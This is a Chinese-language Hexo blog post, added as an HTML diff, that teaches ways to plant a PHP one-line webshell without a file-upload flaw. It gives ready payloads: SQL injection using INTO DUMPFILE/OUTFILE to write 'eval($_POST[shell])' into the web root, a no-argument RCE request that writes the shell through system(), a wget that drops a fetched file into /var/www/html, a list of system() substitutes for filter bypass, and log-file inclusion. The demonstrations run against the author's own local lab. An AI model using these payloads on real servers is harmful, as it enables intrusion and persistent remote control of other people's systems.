@@ -1,0 +1,583 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/nn.png">
+  <link rel="icon" href="/img/nn.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="除了文件上传还有哪些方式可以写一句话木马？一句话木马如果上传到服务器的话，有啥危害学过网络安全的人都知道。但是通常网上流传的方式都是通过文件上传来实现木马上传，实在太过老套，这里就教大家几个新的方式来本地生成一句话木马。(这篇笔记知识带大家入个门，想了解的话还得自己查询资料来学习)
+这篇笔记也是有很多跳转内容，看不懂可以尝试看看跳转的博客，他们写的一定是比我更好">
+  <meta name="author" content="xu">
+  <meta name="keywords" content="">
+  <meta name="description" content="除了文件上传还有哪些方式可以写一句话木马？一句话木马如果上传到服务器的话，有啥危害学过网络安全的人都知道。但是通常网上流传的方式都是通过文件上传来实现木马上传，实在太过老套，这里就教大家几个新的方式来本地生成一句话木马。(这篇笔记知识带大家入个门，想了解的话还得自己查询资料来学习) 这篇笔记也是有很多跳转内容，看不懂可以尝试看看跳转的博客，他们写的一定是比我更好">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql利用group by和with rollup绕过">
+<meta property="og:url" content="http://example.com/2021/12/20/%E4%B8%8D%E5%90%8C%E6%96%B9%E5%BC%8F%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="除了文件上传还有哪些方式可以写一句话木马？一句话木马如果上传到服务器的话，有啥危害学过网络安全的人都知道。但是通常网上流传的方式都是通过文件上传来实现木马上传，实在太过老套，这里就教大家几个新的方式来本地生成一句话木马。(这篇笔记知识带大家入个门，想了解的话还得自己查询资料来学习) 这篇笔记也是有很多跳转内容，看不懂可以尝试看看跳转的博客，他们写的一定是比我更好">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/532b09628fcd4d318f3a34379223ba8c.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b346c51d62c54816983b6f4d94fee529.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f83a36aee4534163865c7bf72d263991.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3d14c76071a8446581de5fc09904d38b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_14,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f931ae20d59147cd820091ec7a1c6303.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/23e910a0080f4996a2cc78949917ef49.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9b5a82d4cabe4f28b7bcbad81e1a6d48.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="article:published_time" content="2021-12-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-25T07:26:13.721Z">
+<meta property="article:author" content="xu">
+<meta property="article:tag" content="特殊姿势">
+<meta property="article:tag" content="一句话木马">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/532b09628fcd4d318f3a34379223ba8c.png">
+  
+  <title>sql利用group by和with rollup绕过 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="/css/mac.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"WEGCXGAa5RG18TvrREJ4E3qM-gzGzoHsz","app_key":"1oISyjS4rilEb9bBzpBVzCpX","server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="sql利用group by和with rollup绕过">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-12-20 00:00" pubdate>
+        December 20, 2021 am
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.4k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      11 分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">sql利用group by和with rollup绕过</h1>
+            
+            <div class="markdown-body">
+              <h1 id="除了文件上传还有哪些方式可以写一句话木马？"><a href="#除了文件上传还有哪些方式可以写一句话木马？" class="headerlink" title="除了文件上传还有哪些方式可以写一句话木马？"></a>除了文件上传还有哪些方式可以写一句话木马？</h1><p>一句话木马如果上传到服务器的话，有啥危害学过网络安全的人都知道。但是通常网上流传的方式都是通过文件上传来实现木马上传，实在太过老套，这里就教大家几个新的方式来本地生成一句话木马。(这篇笔记知识带大家入个门，想了解的话还得自己查询资料来学习)</p>
+<p>这篇笔记也是有很多跳转内容，看不懂可以尝试看看跳转的博客，他们写的一定是比我更好</p>
+<span id="more"></span>
+<h2 id="结合sql注入生成一句话木马"><a href="#结合sql注入生成一句话木马" class="headerlink" title="结合sql注入生成一句话木马"></a>结合sql注入生成一句话木马</h2><p>讲这之前得先介绍mysql配置文件中的<strong>secure_file_priv</strong>选项</p>
+<h3 id="secure-file-priv配置"><a href="#secure-file-priv配置" class="headerlink" title="secure_file_priv配置"></a>secure_file_priv配置</h3><ul>
+<li>secure_file_priv为null    表示不允许导入导出 （5.7后为默认值）</li>
+<li>secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹</li>
+<li>secure_file_priv没有设置时，则表示没有任何限制</li>
+</ul>
+<p>配置文件的位置：</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">在windos下<br><br>mysql.ini的[mysqld]下添加<br><br>在linux下<br><br><span class="hljs-regexp">/etc/my</span>.cnf的[mysqld]下添加<br></code></pre></div></td></tr></table></figure>
+
+<p>也就是说，这个配置一旦打开，我们就能够通过sql语句来实现生成文件功能了</p>
+<p>接下来就是重点介绍生成文件的两个mysql语法了</p>
+<h3 id="into-dumpfile"><a href="#into-dumpfile" class="headerlink" title="into dumpfile"></a>into dumpfile</h3><p>这个语法的作用就是用于自定义写shell文件<br>例如:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">select &quot;&lt;?php eval($_POST[shell]);?&gt;&quot; into dumpfile &#x27;D:\\phpStudy\\PHPTutorial\\WWW\\html\\one\\shell.php&#x27;<br></code></pre></div></td></tr></table></figure>
+<p>into dumpfile后面只能跟绝对路径。</p>
+<p>这里我准备了一个实例给大家</p>
+<p><img src="https://img-blog.csdnimg.cn/532b09628fcd4d318f3a34379223ba8c.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这就是一个简单的整型注入。主要是用于演示，所以就没有进行任何过滤。</p>
+<p>在他后端的代码则是</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">select Name <span class="hljs-keyword">from</span> name where Id = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br></code></pre></div></td></tr></table></figure>
+<p> 那么我们开始注入了，直接制造以下payload<br> <figure class="highlight php-template"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php-template"><span class="xml">1 union select  &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&quot; into dumpfile &#x27;D:\\phpStudy\\PHPTutorial\\WWW\\html\\one\\shell.php&#x27;</span><br></code></pre></div></td></tr></table></figure><br>我想把一句话木马就上传在one目录下，所以我的绝对路径如下，在写绝对路径时，’\‘被默认为转义字符，得再来一个\符号给他转义回路径的意思，所以我们路径中是’\\‘<br><img src="https://img-blog.csdnimg.cn/b346c51d62c54816983b6f4d94fee529.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>等我按下提交后，可以看到原本的目录下面多了一个shell.php,这时候就可以连接蚁剑了</p>
+<p><img src="https://img-blog.csdnimg.cn/f83a36aee4534163865c7bf72d263991.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>这个语法比较难的操控的地方就是不知道后面的绝对路径跟啥，由于我这是在本地测试，所以知道网页的目录在哪儿。但是假如说是linux系统的话，我们可以尝试var/www/html这个默认路径</p>
+<h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h3><p>该函数同样也是写入文件，因为一些细微的差别，这个函数常用的方法是把数据库中的某个表的内容写入到文件，然后再读取这个文件</p>
+<p>所以我们正常操作流程是先创建一个表，然后利用Insert into 把一句话木马插入进去，然后再导出<br>语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">select * from test into outfile &#x27;/tmp/test.txt&#x27;<br></code></pre></div></td></tr></table></figure>
+<p>用法和into dumpfile相似但是又细微的差别</p>
+<p>这里我同样是给大家演示一下，简单给大家看一下读取文件的流程(就不演示向表内写入一句话木马再读取了)<br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">1 union select Id from name where 1=1 into outfile &#x27;D:\\phpStudy\\PHPTutorial\\WWW\\html\\one\\test.txt&#x27;<br><br></code></pre></div></td></tr></table></figure>
+<p>这里可以看到one目录下多了一个test.txt，并且里面的内容就是我们的id，至于这个张三，是我们输入的$_GET[‘Id’] =1 的回显</p>
+<p>想去掉这个张三只需要 id =-1 再union<br><img src="https://img-blog.csdnimg.cn/3d14c76071a8446581de5fc09904d38b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_14,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>接着就可以在我们的url后面访问test.txt文件了，这里面中文字符张三无法显示</p>
+<p><img src="https://img-blog.csdnimg.cn/f931ae20d59147cd820091ec7a1c6303.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这里还得说一点，在注入的时候，我只是select Id from name into outfile ‘xxxx’，并没有select * 是由原因的</p>
+<p>原因就在于我后端是slect Name 只选择一个字段，后面再union 时也只能选择一个字段，要是select *的话，内含Name 和 Id两个字段就会报错</p>
+<p>然后关于这俩语法我就讲到这儿，还有其他读取文件的语法，以及这俩语法有细微的差别。下面是我学习的别人的笔记，写的<strong>真的很好</strong>，大家看不懂我的可以尝试去它的博客看看<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/archive/2021/02/14/14403017.html">Mysql注入 利用系统读、写文件</a></p>
+<h2 id="RCE利用system函数实现本地生成一句话木马"><a href="#RCE利用system函数实现本地生成一句话木马" class="headerlink" title="RCE利用system函数实现本地生成一句话木马"></a>RCE利用system函数实现本地生成一句话木马</h2><p>当大家看到这个标题的时候就应该懂了怎样实现生成一句话木马了，原理也很简单。先给大家展示以下Payloda</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">\\windos<br>system(<span class="hljs-string">&#x27;echo &quot;&lt;?php @eval(/$_POST[shell]);?&gt;&quot;&gt;&gt;shell.php&#x27;</span>);<br><br><br>\\linux<br>system(<span class="hljs-string">&#x27;wget httpp://xxx/xxx -P /var/www/html&#x27;</span>)<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;?php eval($_POST[shell]);?&gt;&#x27;</span> &gt; /home/web/www/PREFIX/htdocs/shell.php<br><br></code></pre></div></td></tr></table></figure>
+<p>这个的话就是考察大家对系统命令的了解程度了<br>利用system，我们就可以实现不需要对方的本地目录也能生成一句话木马的效果</p>
+<p> 就如上面windos的Paylod，生成的一句话木马就是再当前网页的目录，直接读取，蚁剑连接就行。<br> 也可以指定目录，像linux那样，加一个-P就能指定目录了。不想指定把-P去掉就行</p>
+<p>然后也是给大家搭了一个简单的靶场看看<br><img src="https://img-blog.csdnimg.cn/23e910a0080f4996a2cc78949917ef49.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>报错大家不用理会，是因为code里面没有传参所以报错。</p>
+<p>这里就是一个简单的无参数RCE，至于无参数RCE怎么做我就不说了，大家自己了解吧。这里我重点讲一下如何生成一句话木马</p>
+<p>首先Payload:</p>
+<figure class="highlight php-template"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php-template"><span class="xml">?code=eval(end(current(get_defined_vars())));&amp;b=system(&#x27;echo &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;&gt;&gt;shell.php&#x27;);</span><br></code></pre></div></td></tr></table></figure>
+<p>先说说啥意思，下面这段的意思就是可以把b里面的传参读取，并echo。那我们就可以使用system了，具体含义大家学习一下<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45570082/article/details/106602261">无参数RCE绕过</a>就能理解</p>
+<figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm">?<span class="hljs-meta">code</span><span class="hljs-symbol">=eval</span>(<span class="hljs-meta">end</span>(current(get_defined_vars())))<span class="hljs-comment">;&amp;b=</span><br></code></pre></div></td></tr></table></figure>
+<p>那么b中放的变量就是我们的system(‘echo “<?php @eval($_POST[shell]);?>“&gt;&gt;shell.php’);</p>
+<p>这样他就会在当前目录下生成一个shell.php<br><img src="https://img-blog.csdnimg.cn/9b5a82d4cabe4f28b7bcbad81e1a6d48.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>不仅是无参数RCE，RCE里面用于绕过的那一套在这上面同样实用，比如system这个函数经常被过滤，那么在做RCE时我们不常有好几个system的替代函数</p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">system替代函数<br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">shell_exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">pcntl_exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">popen</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">proc_popen</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">passthru</span><span class="hljs-params">()</span></span><br></code></pre></div></td></tr></table></figure>
+<p>原理也是很简单就是利用system嘛，再结合RCE的知识灵活运用</p>
+<h2 id="日志包含写一句话木马"><a href="#日志包含写一句话木马" class="headerlink" title="日志包含写一句话木马"></a>日志包含写一句话木马</h2><p>这个可以说特别常见了，刚开始入门学web安全时，做CTF题基本都会遇到</p>
+<p>原理就是一个<a target="_blank" rel="noopener" href="https://www.cnblogs.com/guoqingsentou/p/13695449.html">本地文件包含漏洞</a></p>
+<p>注意：需要开启服务器记录日志功能</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">访问日志的位置和文件名在不同的系统上会有所差异<br><br>apache一般是<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache/</span>access.log。：<br><br>nginx的log在<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>access.log和<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>error.log<br><br></code></pre></div></td></tr></table></figure>
+<p>当我们看到include函数的时候，可以下意识的去尝试本地包含以下日志文件，看看能不能行得通。加入能包含日志文件，就可以观察日志信息，然后进行相关的注入</p>
+<p>具体操作方法可以看我之前写的一篇<a target="_blank" rel="noopener" href="https://www.gugugux.com.cn/2021/09/16/%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">日志包含漏洞写一句话木马</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总而言之，这些五七八门的方法特别多，重点是学会了可以灵活运用，会运用了，mysql 和RCE也能写一句话木马，包括其他漏洞也时，也能结合起来，这样才是真正的做到理解</p>
+<p>参考链接:<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/archive/2021/02/14/14403017.html">Mysql注入 利用系统读、写文件</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45570082/article/details/106602261">无参数RCE绕过</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/guoqingsentou/p/13695449.html">本地文件包含漏洞</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E7%89%B9%E6%AE%8A%E5%A7%BF%E5%8A%BF/">特殊姿势</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">一句话木马</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/13/groupby/">
+                        <span class="hidden-mobile">sql利用group by和with rollup绕过</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"WEGCXGAa5RG18TvrREJ4E3qM-gzGzoHsz","appKey":"1oISyjS4rilEb9bBzpBVzCpX","path":"window.location.pathname","placeholder":"吐槽","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"https://wegcxgaa.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+      <div class="col-lg-7 mx-auto nopadding-x-md">
+        <div class="container custom mx-auto">
+          欢迎来到我的博客
+        </div>
+      </div>
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
